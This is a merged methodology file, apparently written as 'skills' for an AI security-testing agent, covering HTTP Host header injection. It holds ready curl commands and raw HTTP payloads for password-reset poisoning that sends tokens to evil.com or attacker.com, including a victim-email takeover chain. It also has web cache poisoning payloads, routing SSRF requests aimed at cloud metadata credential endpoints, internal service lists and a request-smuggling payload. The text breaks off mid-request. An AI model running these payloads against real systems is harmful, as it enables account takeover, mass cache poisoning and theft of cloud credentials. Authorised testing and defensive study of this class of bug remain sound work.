# MERGED SOURCE KNOWLEDGE: host-header

85 unique sections from 2 source files. Each section appears in exactly one target.


## SOURCE: hunt-skills/hunt-host-header/SKILL.md

## Grounding / Provenance

This skill is built from the public Host-header attack literature, not invented payloads.
Cite the *technique source* in your report, never a fabricated ID:

- **Password-reset poisoning class** — the canonical write-up is Skelet's/Detectify-era
  "Practical HTTP Host header attacks" (the Django `request.get_host()` → password-reset-link
  case). Many frameworks built the reset URL from the request Host with no `ALLOWED_HOSTS`-style
  allowlist. Cite the framework + the reflected-Host behaviour you actually observed.
- **Web cache poisoning via unkeyed Host / X-Forwarded-Host** — PortSwigger Research,
  James Kettle, "Practical Web Cache Poisoning" (2018) and "Web Cache Entanglement" (2020).
  These define unkeyed-input poisoning, which is the mechanism behind X-Forwarded-Host poisoning.
- **Routing-based SSRF** — PortSwigger Research, "Cracking the lens" / routing-based SSRF
  (Host header steers the front-end's upstream selection).

When you write the report, name the exact behaviour you reproduced (reflected header, cache HIT
on a fresh key, OOB hit from your Collaborator). Do **not** copy a CVE or H1 ID you have not
verified — a missing citation is always better than a wrong one.

---

## Crown Jewel Targets

Host header injection that reaches password reset links = Critical (ATO for any user).

**Highest-value chains:**
- **Password reset poisoning → ATO** — server builds the reset link from the request Host;
  attacker sets `Host: evil.com`; the victim's reset email points the token at the attacker →
  token captured on click → full ATO. Pre-account-takeover variant: even the victim *requesting*
  their own reset leaks the token to evil.com.
- **Web cache poisoning via unkeyed Host** — a CDN/reverse proxy caches a response that reflects
  an attacker `X-Forwarded-Host` into an absolute URL (script src, link, redirect) → poisoned
  entry served to every later visitor on that cache key → mass XSS/redirect/CSP bypass.
- **Routing-based SSRF** — the front-end uses the *Host header itself* to pick the upstream;
  `Host: 169.254.169.254` (or an internal hostname) makes it forward your request to that target
  → cloud metadata / internal admin panels.
- **Path-override SSRF / ACL bypass** — IIS/ASP.NET/Spring honour `X-Original-URL` /
  `X-Rewrite-URL` to override the routed path → reach `/admin` or internal endpoints the edge
  ACL thought it blocked. (Different layer from routing SSRF — see Phase 3.)
- **OAuth/OIDC poisoning** — Host drives `redirect_uri` or the OIDC `issuer` / discovery doc →
  auth-code or token theft → ATO.

---

## Attack Surface Signals

```
Any password reset / forgot-password / email-verification / invite endpoint
Any app behind CDN/reverse proxy (Cloudflare, Varnish, Fastly, Akamai, Nginx, HAProxy)
OAuth/OIDC authorization + /.well-known/openid-configuration endpoints
Absolute URLs constructed from request Host (set-password links, share links, webhooks)
Email-sending endpoints (transactional mail, notifications)
Reverse proxies that may route by Host (k8s ingress, service mesh, internal forward proxies)
```

**Dangerous header candidates (unkeyed / trusted inputs):**
```
Host                 X-Forwarded-Host      X-Host
X-Forwarded-Server   X-HTTP-Host-Override  Forwarded
X-Original-URL       X-Rewrite-URL         X-Override-URL   (path-override class)
```

---

## Step-by-Step Hunting Methodology

> Always test against **your own** registered test account. Never request another user's reset.

# 1a. Override Host directly
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: evil.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"your-test-account@target.com"}'

# 1b. X-Forwarded-Host (behind reverse proxy that trusts it)
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET" \
  -H "X-Forwarded-Host: evil.com" \
  -d "email=your-test-account@target.com"

# 1c. Host + X-Forwarded-Host combo, and X-Host
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET" -H "X-Host: evil.com" \
  -d "email=your-test-account@target.com"

# 1d. Dual-Host / Host override smuggling: some stacks read the SECOND Host
printf 'POST /forgot-password HTTP/1.1\r\nHost: %s\r\nHost: evil.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 33\r\nConnection: close\r\n\r\nemail=your-test-account@target.com' "$TARGET" \
  | openssl s_client -quiet -connect $TARGET:443 2>/dev/null

#     reset link becomes https://TARGET.evil.com/... or routes the token out
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET.evil.com" -d "email=your-test-account@target.com"

# 1f. Trailing-port / userinfo confusion (parsers that split on : or @)
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET:1@evil.com" -d "email=your-test-account@target.com"
```

**Confirm:** open the reset email *in your own test inbox* and read the link host. The token must
appear under an attacker-controlled host (`evil.com`, `$TARGET.evil.com`, or a Collaborator
domain) for this to be a real finding. **Use a Burp Collaborator domain as the injected host** so
that when the victim clicks (or a preview-fetcher fetches), you capture the token out-of-band and
have proof — see Validation.

### Phase 2 — Web Cache Poisoning via Host / X-Forwarded-Host

Mechanism: this is a **reflection** bug, not an OOB bug. The injected host must be *reflected into
the response body* (an absolute URL, script `src`, `<link href>`, `<base href>`, redirect
`Location`, or canonical/og:url) **and** that response must be **cached on a key you do not
control**. No Collaborator callback is expected from the cache test itself — only later, if a
victim's browser loads the poisoned absolute URL.

```bash

# 2a. Is the host reflected into the body?
curl -s https://$TARGET/ \
  -H "Host: $TARGET" -H "X-Forwarded-Host: canary-$RANDOM.example" \
  | grep -i "canary"

# 2b. Is the response cacheable, and what is the cache key?
curl -sI "https://$TARGET/?cb=$RANDOM" \
  | grep -iE "cache-control|cf-cache-status|x-cache|age|via|surrogate|vary"

#   Look for: X-Cache/CF-Cache-Status: HIT, nonzero Age, Via: varnish/fastly/cloudfront.

#   Check Vary: — if Vary does NOT include X-Forwarded-Host, the header is UNKEYED → poisonable.

# 2c. Prove poisoning: poison once, then fetch CLEAN (no injected header) on same key.
URL="https://$TARGET/?cb=poison$RANDOM"
curl -s "$URL" -H "X-Forwarded-Host: evilcdn.example" >/dev/null   # poison
curl -s "$URL" | grep -i "evilcdn.example"                        # clean victim view → reflected = POISONED
```

**False-positive killers (mandatory):**
- A reflection that only ever appears for *your* request (because the header is **keyed**, e.g. in
  `Vary`, or the CDN includes Host in the key) is **not** poisoning — confirm 2c returns the
  payload on a request that *omits* the header.
- `Age: 0` + `MISS` every time → no shared cache → no mass impact. Demote to self-only / Low.
- Confirm blast radius from a **second machine / fresh egress IP / incognito** before claiming
  "mass". Cache scope is often per-edge / per-cookie / per-geo.

### Phase 3 — SSRF via Host Header — TWO DISTINCT MECHANISMS (do not conflate)

These operate at different layers. Test them separately; they do **not** compose into one request.

**(3A) Routing-based SSRF — the Host header selects the upstream.** The path goes on the
**request line**, exactly as a normal request, because the metadata service / internal host serves
plain HTTP and only sees the request line + headers you forward. `X-Original-URL` is irrelevant
here — the EC2 IMDS ignores it.

```bash

# Correct routing-SSRF probe: path on the request line, Host steers the proxy upstream.
curl -s "https://$TARGET/latest/meta-data/" -H "Host: 169.254.169.254"
curl -s "https://$TARGET/latest/meta-data/iam/security-credentials/" -H "Host: 169.254.169.254"

# GCP / Azure equivalents (still routing via Host):
curl -s "https://$TARGET/computeMetadata/v1/" \
  -H "Host: metadata.google.internal" -H "Metadata-Flavor: Google"
curl -s "https://$TARGET/metadata/instance?api-version=2021-02-01" \
  -H "Host: 169.254.169.254" -H "Metadata: true"

# Internal hostname / port routing:
curl -s "https://$TARGET/" -H "Host: localhost:6379"   # Redis behind the proxy
curl -s "https://$TARGET/" -H "Host: internal-admin.svc.cluster.local"

# Blind / no reflection? Point the Host at a Collaborator subdomain and watch for the

# proxy's outbound DNS/HTTP lookup — that proves the front-end resolves the attacker host.
curl -s "https://$TARGET/" -H "Host: $COLLAB"
```

**(3B) Path-override SSRF / ACL bypass — `X-Original-URL` / `X-Rewrite-URL`.** This is an
IIS/ASP.NET/Spring-Cloud-Gateway feature where the app overrides the *routed path*. The real Host
stays put; you are bypassing an **edge path ACL**, not steering an upstream. Keep the real Host.

```bash

# Reach an internal/blocked path the edge thought it denied. Real Host stays.
curl -s "https://$TARGET/" -H "Host: $TARGET" -H "X-Original-URL: /admin"
curl -s "https://$TARGET/" -H "Host: $TARGET" -H "X-Rewrite-URL: /internal/metrics"

# Diff against a direct GET /admin (which the edge blocks) — a different status/body proves override.
```

> The old probe `Host: 169.254.169.254` + `X-Original-URL: /latest/meta-data/` was wrong: those
> two headers act at different layers and never compose. Use 3A for metadata, 3B for ACL bypass.

# Does the authorization endpoint build redirect_uri / display URL from Host?
curl -s "https://$TARGET/oauth/authorize?response_type=code&client_id=app&redirect_uri=https://$TARGET/cb" \
  -H "Host: evil.com" | grep -iE "redirect|location|action="

# OIDC discovery: if issuer/endpoints reflect Host, the whole flow can be re-pointed.
curl -s "https://$TARGET/.well-known/openid-configuration" -H "X-Forwarded-Host: evil.com" \
  | grep -iE "issuer|authorization_endpoint|token_endpoint|jwks_uri"
```

**Confirm:** the auth code / token must actually be delivered to the attacker host (capture on
Collaborator) — a reflected string alone is not ATO.

### Phase 5 — Header Fuzzing (Param Miner)

Burp **Param Miner → Guess headers** is faster and finds unkeyed/cache-affecting headers the list
below misses. Manual sweep:

```bash
HOST_HEADERS=(X-Forwarded-Host X-Host X-Forwarded-Server X-HTTP-Host-Override \
  Forwarded X-Original-URL X-Rewrite-URL X-Override-URL X-Forwarded-Scheme)
for H in "${HOST_HEADERS[@]}"; do
  echo "=== $H ==="
  curl -s -I "https://$TARGET/" -H "$H: canary-$RANDOM.example" \
    | grep -iE "location|x-cache|cf-cache|age|set-cookie"
done
```

---

## Chain Table

| Finding | Chain to | Impact |
|---------|----------|--------|
| Reset link host = attacker (own test acct) | Collaborator-host injection → capture token on click | Critical — ATO any user |
| X-Forwarded-Host reflected in absolute URL + cacheable, unkeyed | Poison key → clean fetch returns payload → load XSS/redirect | High — mass cache poisoning |
| Front-end routes by Host | `Host: 169.254.169.254` path-on-request-line → creds | High/Critical — SSRF → cloud creds |
| `X-Original-URL` overrides path | Reach `/admin` blocked at edge | High — ACL bypass / SSRF |
| OAuth redirect_uri/issuer built from Host | Re-point flow → capture code/token on Collaborator | Critical — ATO via code theft |

---

## Validation (house discipline)

✅ **Password reset:** the token URL in **your own test account's email** uses an
attacker-controlled host. Strongest proof = inject a **Collaborator** host and show the inbound
HTTP hit carrying the token when the link is clicked/previewed (OOB capture).
✅ **Cache poison:** a request that **omits** the injected header (fresh egress IP / incognito)
still returns the attacker payload → shared-cache poisoning proven. Demote to Low if Vary-keyed or
`MISS`/`Age:0` only.
✅ **Routing SSRF:** real response body from `169.254.169.254` / internal host, **or** an OOB
DNS/HTTP hit on your Collaborator from the front-end (blind case).
✅ **Path-override:** status/body diff vs the edge-blocked direct request proves the override took.
✅ **OAuth/OIDC:** the auth code / token is actually delivered to the attacker host (captured),
not merely reflected.

**Always rule out false positives:**
- Reflected ≠ cached. Cached-for-you ≠ cached-for-others (check `Vary`, second IP).
- A 200 echoing your Host string is not SSRF unless the *response content* came from the internal
  target or your Collaborator fired.
- Some mailers rewrite links to a fixed `SITE_URL` regardless of Host — reflected header in the
  HTTP response does not guarantee a poisoned *email*; verify the email body.

**Severity:**
- Reset → ATO for any user: Critical
- Routing SSRF → cloud metadata creds: Critical (if creds usable) / High
- Cache poisoning → mass XSS/redirect (shared key proven): High
- Path-override → internal/admin reach: High
- Reflected only, uncacheable, not in email, no internal reach: Low / informational


## SOURCE: normal-skills/host-header-injection.md

name: host-header-injection
description: Comprehensive host header injection testing methodology covering password reset poisoning, web cache poisoning, virtual host misrouting, SSRF via host manipulation, and advanced header variation exploitation with optimized detection and payload techniques.
version: 1.0.0
---

## Overview

Host Header Injection is an attack technique that exploits applications, reverse proxies, load balancers, and caching layers that improperly trust, process, or reflect the `Host` header or its derived alternatives (`X-Forwarded-Host`, `X-HTTP-Host-Override`, `Forwarded`, `:authority`). By manipulating these headers, an attacker can poison password reset emails, poison web caches, route requests to unintended virtual hosts, bypass access controls, and induce Server-Side Request Forgery (SSRF) to internal cloud metadata services.

**HTTP Architecture Context:**
- **HTTP/1.1 Host Header:** Mandatory header defining the target domain (`Host: example.com`)
- **Absolute URI:** `GET http://example.com/path HTTP/1.1` (Host header may be ignored by some proxies)
- **HTTP/2 `:authority`:** Pseudo-header replacing Host in HTTP/2 streams
- **Reverse Proxy Routing:** nginx (`server_name`), Apache (`VirtualHost`), AWS ALB/CloudFront (`Host`-based routing)
- **Cache Key Components:** Often includes Host header + URI + Query String (Varnish, CloudFront, Akamai, Fastly)

**Target Indicators:**
- Password reset functionality sending clickable email links
- Cache layers (CDN, Varnish, Squid, nginx proxy_cache)
- Multi-tenant applications with virtual host routing
- Internal admin panels accessible via hostname restrictions
- Cloud deployments (AWS EC2, GCP Compute Engine, Azure VMs)
- Applications reflecting the Host header in HTML, JavaScript, redirects, or emails

---

### 1.1 Basic Host Header Manipulation

Replace the legitimate `Host` header value with an attacker-controlled domain and observe behavioral changes in responses.

**Baseline Request:**
```http
GET / HTTP/1.1
Host: example.com
```

**Detection Payloads:**

| Test | Modified Header | Indicator of Vulnerability |
|------|----------------|---------------------------|
| Direct replacement | `Host: attacker.com` | Links/redirects point to `attacker.com` |
| Subdomain injection | `Host: attacker.example.com` | DNS resolution attempted, CORS/SSL errors |
| Port injection | `Host: example.com:attacker.com` | Reflected in URLs, parser differential |
| Null byte injection | `Host: example.com%00.attacker.com` | String termination in C-based parsers |
| Case variation | `Host: EXAMPLE.COM` | Case-sensitive routing differences |

**Response Analysis Checklist:**
- [ ] Does the response contain absolute URLs using the injected Host? (`https://attacker.com/reset?token=...`)
- [ ] Are `Location` headers using the injected Host? (`Location: https://attacker.com/login`)
- [ ] Is the Host reflected in HTML (`<base href="https://attacker.com/">`, `<a href="https://attacker.com/...">`)?
- [ ] Is the Host reflected in JavaScript (`var apiHost = "attacker.com";`)?
- [ ] Are email templates (password reset, welcome) using the injected Host in links?
- [ ] Do CSP headers (`Content-Security-Policy`) reference the injected Host?
- [ ] Do CORS headers (`Access-Control-Allow-Origin`) reflect the injected Host?

### 1.2 Header Variation Fuzzing

Test all alternative headers that downstream components may use to determine the target host.

**Complete Header Variation Matrix:**

```http
Host: attacker.com
X-Forwarded-Host: attacker.com
X-HTTP-Host-Override: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
X-Forwarded-Scheme: https
X-Original-URL: http://attacker.com/
X-Rewrite-URL: http://attacker.com/
Forwarded: host=attacker.com
Forwarded: for=192.168.1.1;host=attacker.com;proto=https
Front-End-Https: on
X-Scheme: https
:authority: attacker.com        (HTTP/2 only)
```

**Testing Strategy:**
1. Send each header individually while keeping the original `Host: example.com`
2. Send combinations (Host + X-Forwarded-Host with conflicting values)
3. Observe which header "wins" in routing, reflection, or email generation
4. Document the precedence chain (e.g., `X-Forwarded-Host` overrides `Host` in some nginx configs)

### 1.3 Double Host Header Injection

Some proxies and servers use the first Host header; others use the last. Injecting duplicate headers can reveal parsing differentials.

```http
Host: example.com
Host: attacker.com
```

**Behavioral Analysis:**
- **First-wins parsers** (most RFC-compliant): Use `example.com`
- **Last-wins parsers** (some PHP/Apache configurations): Use `attacker.com`
- **Concatenation:** `example.com, attacker.com` or `example.comattacker.com`

### 1.4 Absolute URI vs Host Header Differential

HTTP/1.1 allows absolute URIs in the request line. Some proxies prioritize the absolute URI over the Host header.

```http
GET http://attacker.com/ HTTP/1.1
Host: example.com
```

**Vulnerability:** If the cache or origin server uses different sources for the host value, this creates a desync or routing issue.

### 1.5 HTTP/2 `:authority` Pseudo-Header Downgrade

HTTP/2 to HTTP/1.1 conversion introduces translation of `:authority` to `Host`. Injecting conflicting values can cause Host header injection in HTTP/2-enabled environments.

```http

# HTTP/2 pseudo-headers
:method: GET
:path: /
:scheme: https
:authority: attacker.com
```

**Downgrade Attack:** If the HTTP/2 frontend translates `:authority` to `Host` but the backend also processes `X-Forwarded-Host`, conflicting routing may occur.

### 1.6 Line Wrapping / HTTP Request Smuggling Context

Injecting Host header values with newline characters can lead to request smuggling, which amplifies Host header injection impact.

```http
Host: example.com
Host: attacker.com
Content-Length: 5

0

GET /admin HTTP/1.1
Host: internal.admin.local
```

*(See Phase 6 for Host Header + Request Smuggling chains)*

---

### 2.1 Attack Mechanics

When a user requests a password reset, the application generates a unique token and sends an email containing a reset link. If the application uses the `Host` header (or its alternatives) to construct the base URL of this link, an attacker can inject a malicious host to receive the reset token.

**Vulnerable Code Pattern (Pseudo):**
```python
reset_url = f"https://{request.headers.get('Host')}/reset-password?token={token}"
send_email(to=user.email, body=f"Click here: {reset_url}")
```

### 2.2 Standard Poisoning Payloads

**Basic Host Replacement:**
```http
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

**X-Forwarded-Host Poisoning (When Host is sanitized but X-Forwarded-Host is trusted):**
```http
POST /forgot-password HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

**Double Host Header (Last-wins parser):**
```http
POST /forgot-password HTTP/1.1
Host: example.com
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

**Absolute URI Poisoning:**
```http
POST http://attacker.com/forgot-password HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

### 2.3 Token Interception & Account Takeover Chain

1. **Identify the password reset endpoint** (`/forgot-password`, `/reset`, `/api/v1/auth/forgot`)
2. **Submit victim's email address** with poisoned Host header
3. **Monitor attacker-controlled server** (e.g., `attacker.com` access logs) for incoming GET request containing reset token
4. **Extract token** from access log query parameters: `GET /reset-password?token=abc123...`
5. **Submit token** to legitimate reset endpoint to change victim's password
6. **Authenticate** as victim

**Optimized Detection for Password Reset Poisoning:**

| Test | Payload | Success Indicator |
|------|---------|-------------------|
| Direct Host | `Host: attacker.com` | Email link points to `attacker.com` |
| X-Forwarded-Host | `X-Forwarded-Host: attacker.com` | Email link uses `attacker.com` |
| X-HTTP-Host-Override | `X-HTTP-Host-Override: attacker.com` | Email link uses `attacker.com` |
| Port suffix | `Host: example.com:attacker.com` | Parser extracts `attacker.com` |
| Scheme injection | `X-Forwarded-Proto: http` + `X-Forwarded-Host: attacker.com` | Link uses `http://attacker.com` |
| Unicode/IDN | `Host: attacker．com` (fullwidth dot) | Homograph bypass + link generation |

### 2.4 Bypassing Host Validation Filters

If the application validates the Host header against a whitelist:

**Subdomain Injection:**
```http
Host: attacker.com.example.com
```
*(If the application uses `endswith('.example.com')` validation)*

**Null Byte Injection:**
```http
Host: example.com%00.attacker.com
```
*(C-based string termination)*

**Port Injection with URL Parsing Differential:**
```http
Host: example.com:80@attacker.com
Host: example.com?@attacker.com
```
*(If the URL parser used for email generation differs from the Host validator)*

**Header Precedence Bypass:**
```http
Host: example.com
X-Forwarded-Host: attacker.com
```
*(Application validates `Host` but email generator trusts `X-Forwarded-Host`)*

### 2.5 Password Reset Response Analysis

Even if the email is not directly visible, analyze the response for indirect leakage:

- **JSON response** containing the reset URL for "debugging" in dev environments
- **Redirect** to `attacker.com` after submission (`Location: https://attacker.com/reset-sent`)
- **Response body** reflecting the generated URL
- **Error messages** revealing the backend mailer configuration

---

### 3.1 Attack Mechanics

Web Cache Poisoning via Host header occurs when:
1. The **cache** keys the response using one host value (e.g., the original `Host: example.com`)
2. The **origin server** processes a different host value (e.g., `X-Forwarded-Host: attacker.com`) and reflects it in the response body or headers
3. The **poisoned response** is cached and served to other users requesting the same cache key

**Architecture Context:**
- **Varnish:** Default cache key includes `Host` + `URL`; if `X-Forwarded-Host` is processed by backend but not in cache key → poisonable
- **CloudFront:** Can be configured to forward/host-header behavior; if origin reflects `X-Forwarded-Host` in cacheable response → poisonable
- **nginx proxy_cache:** Cache key uses `$host`; if backend uses `$http_x_forwarded_host` → differential
- **Akamai/Fastly:** Highly configurable; check for `Host` vs `X-Forwarded-Host` in cache key rules

### 3.2 Differential Processing Detection

**Step 1: Identify Cacheable Endpoint**
Look for static assets, search results, or API responses with cache headers:
- `Cache-Control: public, max-age=3600`
- `X-Cache: HIT` / `X-Cache: MISS`
- `CF-Cache-Status: HIT` (CloudFlare)
- `Age: 45`

**Step 2: Inject Host Variation**
```http
GET /search?q=test HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com
```

**Step 3: Check for Reflection**
- Response body contains `attacker.com`
- Response headers (`Location`, `Content-Security-Policy`, `Link`, `Access-Control-Allow-Origin`) contain `attacker.com`

**Step 4: Verify Cache Poisoning**
1. Send poison request with `X-Forwarded-Host: attacker.com`
2. Observe `X-Cache: MISS` (or similar)
3. Send benign request (no injected header) from different session/IP
4. Observe `X-Cache: HIT` and poisoned content in response

### 3.3 Cache Poisoning Payloads by Technology

**Varnish (Default Config):**
```http
GET / HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com
```
*Cache keys on Host; backend reflects X-Forwarded-Host → poisoned*

**CloudFront (Forwarded Host Behavior):**
```http
GET /api/config HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com
```
*If origin returns JSON with `{"apiEndpoint": "//attacker.com/api"}` and response is cached*

**nginx (proxy_cache with $host key):**
```http
GET /static/app.js HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com
```
*If backend template injects `var BASE_URL = "https://{{.Host}}/";` using X-Forwarded-Host*

### 3.4 Reflected Host in Cacheable Resources

**JavaScript Files:**
```http
GET /config.js HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com
```
Response:
```javascript
var API_BASE = "https://attacker.com/v1";
```
*All users load this poisoned JS, sending API calls to attacker.com*

**JSON Configuration Endpoints:**
```http
GET /api/v1/config HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com
```
Response:
```json
{"base_url": "https://attacker.com", "cdn_url": "https://attacker.com/assets"}
```

**Open Graph / Meta Tags:**
```html
<meta property="og:url" content="https://attacker.com/page">
<link rel="canonical" href="https://attacker.com/page">
```

### 3.5 Denial of Service via Cache Poisoning

Poison the cache to serve error pages or invalid content to all users.

```http
GET / HTTP/1.1
Host: example.com
X-Forwarded-Host: invalid..host
```
*If backend throws 500 error and cache caches the 500 response*

```http
GET / HTTP/1.1
Host: example.com
X-Forwarded-Host: AAAAAAAAAA...(10000 chars)
```
*If backend reflects Host in headers and exceeds header size limits, causing 502/503*

### 3.6 Cache Key Injection

Some CDNs include specific headers in the cache key. Injecting values into these can create targeted poisoning.

```http
GET / HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com
Accept-Language: en-US
```
*If cache keys on Accept-Language + Host, poison only affects en-US users*

---

### 4.1 Attack Mechanics

Reverse proxies and web servers route requests to different backend applications based on the `Host` header (virtual host routing). By manipulating the Host header, an attacker may route requests to internal administrative interfaces, development environments, or other tenants' applications that are not exposed via public DNS or external IP binding.

**Common Routing Configurations:**

**nginx:**
```nginx
server {
    listen 80;
    server_name admin.internal.local;
    location / { proxy_pass http://127.0.0.1:8080; }
}
server {
    listen 80;
    server_name example.com;
    location / { proxy_pass http://backend:3000; }
}
```

**Apache:**
```apache
<VirtualHost *:80>
    ServerName admin.internal.local
    DocumentRoot /var/www/admin
</VirtualHost>
<VirtualHost *:80>
    ServerName example.com
    DocumentRoot /var/www/public
</VirtualHost>
```

### 4.2 Internal Admin Interface Access

**Direct Host Spoofing:**
```http
GET / HTTP/1.1
Host: admin.internal.local
```

**Common Internal Hostnames to Test:**
```
admin.localhost
admin.internal
admin.internal.local
localhost
127.0.0.1
0.0.0.0
[::1]
internal.example.com
dev.example.com
staging.example.com
api-internal.example.com
grafana.internal
kibana.internal
jenkins.internal
kubernetes.default.svc.cluster.local
```

**With X-Forwarded-Host (if reverse proxy uses this for routing):**
```http
GET / HTTP/1.1
Host: example.com
X-Forwarded-Host: admin.internal.local
```

### 4.3 Access Control Bypass

Many applications restrict access to `/admin` based on the Host header or source IP. If the Host header routes to an internal interface that lacks IP restrictions:

```http
GET /admin/dashboard HTTP/1.1
Host: admin.internal.local
```
*Bypasses external IP whitelist because the request is routed internally*

### 4.4 Cloud Metadata & Internal Service Routing

In cloud environments, the Host header may be used to route to internal metadata endpoints or sidecar containers.

```http
GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
```
*(If the reverse proxy routes based on Host and forwards the request to the metadata service)*

### 4.5 Kubernetes / Container Environment Misrouting

```http
GET / HTTP/1.1
Host: kubernetes.default.svc.cluster.local
```

```http
GET / HTTP/1.1
Host: backend-service.namespace.svc.cluster.local
```

**Service Discovery Enumeration:**
```
service-name.default.svc.cluster.local
service-name.namespace.svc.cluster.local
service-name.namespace.svc
service-name
backend
api
db
redis
```

---

### 5.1 Attack Mechanics

When the application uses the `Host` header to construct outgoing requests (webhooks, API calls, resource fetching, health checks), manipulating the Host header can force the server to send requests to arbitrary internal or external targets.

**Vulnerable Code Pattern (Pseudo):**
```python
host = request.headers.get('Host')
response = requests.get(f"http://{host}/internal/api/status")
```

### 5.2 Cloud Metadata API Access

**AWS EC2 Instance Metadata Service (IMDSv1 & IMDSv2):**
```http
GET / HTTP/1.1
Host: 169.254.169.254
```

**Direct Metadata Path Access:**
```http
GET /latest/meta-data/ HTTP/1.1
Host: 169.254.169.254
```

```http
GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
```

```http
GET /latest/meta-data/iam/security-credentials/ROLE_NAME HTTP/1.1
Host: 169.254.169.254
```

**IMDSv2 Session Token Retrieval (if PUT is allowed via Host-derived request):**
```http
PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600
```

**GCP Metadata:**
```http
GET /computeMetadata/v1/ HTTP/1.1
Host: metadata.google.internal
Metadata-Flavor: Google
```

```http
GET /computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1
Host: metadata.google.internal
Metadata-Flavor: Google
```

**Azure Metadata:**
```http
GET /metadata/instance?api-version=2021-02-01 HTTP/1.1
Host: 169.254.169.254
Metadata: true
```

### 5.3 Internal Service Enumeration & Access

```http
GET / HTTP/1.1
Host: 127.0.0.1
```

```http
GET / HTTP/1.1
Host: 127.0.0.1:8080
```

```http
GET / HTTP/1.1
Host: 192.168.1.1
```

```http
GET / HTTP/1.1
Host: 10.0.0.1
```

**Common Internal Targets:**
```
localhost:22          (SSH banner grabbing)
localhost:3306        (MySQL)
localhost:5432        (PostgreSQL)
localhost:6379        (Redis)
localhost:9200        (Elasticsearch)
localhost:27017       (MongoDB)
localhost:8080        (Alternative web admin)
localhost:8443        (HTTPS admin)
localhost:3000        (Grafana, Dev apps)
localhost:5000        (Docker registry, Flask)
localhost:9000        (MinIO, SonarQube)
localhost:2375        (Docker daemon)
```

### 5.4 SSRF via Header Combinations

Some applications construct URLs using multiple headers:

```http
GET /api/fetch HTTP/1.1
Host: example.com
X-Forwarded-Host: 169.254.169.254
X-Forwarded-Port: 80
X-Forwarded-Proto: http
```

**Absolute URL Construction:**
```http
GET / HTTP/1.1
Host: 169.254.169.254
X-Forwarded-Proto: http
```
*Backend constructs: `http://169.254.169.254/latest/meta-data/`*

### 5.5 SSRF to Internal APIs with Authentication Bypass

If the backend application makes authenticated requests to internal APIs using the Host header:

```http
GET /internal/api/users HTTP/1.1
Host: 127.0.0.1:8080
```
*May bypass external-facing authentication if internal API trusts localhost*

---

### 6.1 X-Forwarded-Host

The most common alternative header used by reverse proxies. Many frameworks trust this header for generating URLs when behind a load balancer.

**Detection:**
```http
GET / HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com
```

**Precedence Testing:**
```http
GET / HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com
X-Forwarded-Port: 8080
X-Forwarded-Proto: https
X-Forwarded-Server: attacker.com
```

### 6.2 X-HTTP-Host-Override

Used by some PHP frameworks and legacy proxies.

```http
GET / HTTP/1.1
Host: example.com
X-HTTP-Host-Override: attacker.com
```

### 6.3 Forwarded (RFC 7239)

Standardized forwarding header. Complex parsing can lead to injection.

```http
GET / HTTP/1.1
Host: example.com
Forwarded: for=192.168.1.1;host=attacker.com;proto=https
```

```http
GET / HTTP/1.1
Host: example.com
Forwarded: host=attacker.com
```

**Parser Differential:** Some implementations parse the first `host=` token; others parse the last.

### 6.4 HTTP/2 `:authority` Pseudo-Header

In HTTP/2, the `:authority` pseudo-header replaces the `Host` header. During HTTP/2 downgrade to HTTP/1.1, translation issues can occur.

**HTTP/2 Direct Injection:**
```http
:method: GET
:path: /
:scheme: https
:authority: attacker.com
```

**HTTP/2 to HTTP/1.1 Desync:**
```http

# HTTP/2 frontend translates to:
GET / HTTP/1.1
Host: attacker.com
```
*If the backend also processes `X-Forwarded-Host`, dual injection is possible*

**HTTP/2 with Conflicting Headers:**
```http
:authority: example.com
Host: attacker.com
```
*Some translators use `:authority`; others use `Host` → routing differential*

### 6.5 Additional Proxy Headers

```http
X-Host: attacker.com
X-Original-Host: attacker.com
X-Rewrite-URL: http://attacker.com/
X-Original-URL: http://attacker.com/
X-Forwarded-Server: attacker.com
X-Forwarded-Scheme: https
X-Scheme: https
Front-End-Https: on
X-ProxyUser-Ip: 127.0.0.1
```

### 6.6 Host Header Concatenation Attacks

Some servers concatenate multiple Host header values:

```http
Host: example.com
Host: attacker.com
```

Result: `Host: example.com, attacker.com` or `example.comattacker.com`

If the URL parser extracts the second host from a comma-separated list:
```http
Host: example.com, attacker.com
```

### 6.7 Port Injection & URL Parser Differentials

```http
Host: example.com:443@attacker.com
Host: example.com?@attacker.com
Host: example.com\attacker.com
Host: example.com.attacker.com
```

**If the application uses a URL parser to extract the host:**
- Python `urllib.parse.urlparse()` vs `request.headers.get('Host')` may yield different results
- Node.js `url.parse()` vs `req.headers.host`
- Java `URI` class vs raw header string

---

### 7.1 Host Header + HTTP Request Smuggling

Combine Host header injection with request smuggling to route smuggled requests to internal hosts or poison caches with internal responses.

**CL.TE Desync with Host Injection:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 60
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: admin.internal.local
Foo: bar
```

**TE.CL Desync:**
```http
POST / HTTP/1.1
Host: example.com
